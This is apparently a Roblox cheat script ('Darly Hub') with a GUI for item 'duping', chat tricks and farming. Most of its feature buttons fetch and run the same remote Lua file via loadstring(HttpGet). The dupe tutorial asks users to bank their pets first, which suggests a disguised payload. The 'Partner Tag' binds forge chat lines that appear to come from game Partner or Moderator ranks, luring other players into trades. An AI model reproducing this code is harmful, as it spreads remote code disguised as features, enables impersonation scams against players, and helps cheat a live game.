local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/MrGalaxy10/orion-library/main/PrivateSource",true))()
local Window = OrionLib:MakeWindow({Name = "Darly Hub", IntroEnabled = false, HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})

local Tab = Window:MakeTab({
	Name = "Info",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("Hello","If u readin this that mean u use my hub, thanks for it                        Owner: bay#2128")


local Tab = Window:MakeTab({
	Name = "Dupe (Working)",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("Click Start Dupe And Working")

Tab:AddParagraph("Tutorial","Put the pets/diamonds you want to dupe into your bank and then click start.
When it says success rejoin the game!")


Tab:AddButton({
	Name = "Start Dupe",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua", true))()
  	end    
})


local Tab = Window:MakeTab({
	Name = "Partner Tag",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddParagraph("Tips to get best hits","If u want to get a huge or something cool u should dont spam too much with this, say it like 1 time and then wait 10-15 sec after chat will spam your messages out, after that say it again and repeat until u get a hit, after u get a hit serverhop")
Tab:AddParagraph("READ THIS","Put script in autoexec folder so u dont have to click execute over and over after serverhopping")


Tab:AddButton({
    Name = "Message Singing pets",
	Callback = function()
      		local Message = "Signing Pets!" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end



local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})

Tab:AddBind({
	Name = "Signing Pets",
	Default = Enum.KeyCode.KeypadOne,
	Hold = false,
	Callback = function()
	    local Message = "Signing Pets!" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end

local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})

Tab:AddBind({
	Name = "Hello Everyone",
	Default = Enum.KeyCode.KeypadTwo,
	Hold = false,
	Callback = function()
	    local Message = "Hello Everyone!!!" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end

local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})

Tab:AddBind({
	Name = "Sent me trade",
	Default = Enum.KeyCode.KeypadThree,
	Hold = false,
	Callback = function()
	    local Message = "Sent me trade" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end

local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})

Tab:AddBind({
	Name = "Signing Huges",
	Default = Enum.KeyCode.KeypadFour,
	Hold = false,
	Callback = function()
	    local Message = "Signing Huges" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end

local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})

Tab:AddBind({
	Name = "Serverhop Bind",
	Default = Enum.KeyCode.KeypadNine,
	Hold = false,
	Callback = function()
		local module = loadstring(game:HttpGet"https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua")()

module:Teleport(game.PlaceId)
	end    
})

Tab:AddBind({
	Name = "Giant Player",
	Default = Enum.KeyCode.KeypadFive,
	Hold = false,
	Callback = function()
size = 5 -- from 1 to 5

local LocalPlayer = game:GetService("Players").LocalPlayer
local Character = LocalPlayer.Character
local Humanoid = Character:FindFirstChildOfClass("Humanoid")

function rm()

for i,v in pairs(Character:GetDescendants()) do
if v:IsA("BasePart") then
if v.Name == "Handle" or v.Name == "Head" then
if Character.Head:FindFirstChild("OriginalSize") then
Character.Head.OriginalSize:Destroy()
end
else
for i,cav in pairs(v:GetDescendants()) do
if cav:IsA("Attachment") then
if cav:FindFirstChild("OriginalPosition") then
cav.OriginalPosition:Destroy() 
end
end
end
v:FindFirstChild("OriginalSize"):Destroy()
if v:FindFirstChild("AvatarPartScaleType") then
v:FindFirstChild("AvatarPartScaleType"):Destroy()
end
end
end
end
end


if size == 1 then
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)
end

if size == 2 then
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)
end

if size == 3 then
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)
end

if size == 4 then
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)
end


if size == 5 then
rm()
wait(0.5)
Humanoid:FindFirstChild("BodyProportionScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyHeightScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyWidthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("BodyDepthScale"):Destroy()
wait(1)

rm()
wait(0.5)
Humanoid:FindFirstChild("HeadScale"):Destroy()
wait(1)
end
  	end    
})

Tab:AddBind({
	Name = "Works with Giant player(dont change)",
	Default = Enum.KeyCode.KeypadFive,
	Hold = false,
	Callback = function()
	    local Message = "/e giant me" -- Message --
local Rank = "Partner" -- Partner for PARTNER - Moderator for MODERATOR --

if Rank and type(Rank) == "string" then
    if Rank == "Partner" then
        Rank = "🔥Partner"
    else
        if Rank == "Moderator" then
            Rank = "MODERATOR"
        end
    end
end

local Wow = "                                                                                                                                                       "
if Rank and Message and type(Message) == "string" then
    game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(""..Wow.."["..Rank.."] ["..game.Players.LocalPlayer.DisplayName.."]: "..Message.."", "All")
end
  	end    
})


Tab:AddBind({
	Name = "Custom Text",
	Default = Enum.KeyCode.KeypadSix,
	Hold = false,
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua"))()
	end    
})


Tab:AddButton({
	Name = "Moon Partner Tag",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua"))()
  	end    
})

  
local Tab = Window:MakeTab({
	Name = "Farming",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Milk Up Beta",
	Callback = function()
      		loadstring(game:HttpGet("https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua"))()
  	end    
})

Tab:AddButton({
	Name = "Huge Games PREMIUM",
	Callback = function()
      		getgenv().AuthKey="HUGE_uDHHZxagRcoYwGkd"
getgenv().LoadSettings={
    UseSeperateSaves=false,
    DisableStartupPrompt=false,
    DisableGamepassCheck=false,
}
loadstring(game:HttpGet("https://raw.githubusercontent.com/Void1337dc/scripts/main/DupeScriptOP.lua"))()
  	end    
})

local Tab = Window:MakeTab({
	Name = "Destroy Gui",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

Tab:AddButton({
	Name = "Destroy it!",
	Callback = function()
      		OrionLib:Destroy()
  	end    
})
  

OrionLib:Init()